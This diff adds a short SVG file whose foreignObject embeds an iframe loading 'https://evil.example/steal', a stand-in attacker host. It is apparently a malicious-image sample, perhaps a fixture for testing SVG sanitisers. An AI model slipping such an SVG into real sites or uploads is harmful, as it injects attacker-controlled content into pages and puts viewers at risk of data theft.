@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
+  <foreignObject x="0" y="0" width="200" height="200">
+    <iframe src="https://evil.example/steal"></iframe>
+  </foreignObject>
+</svg>
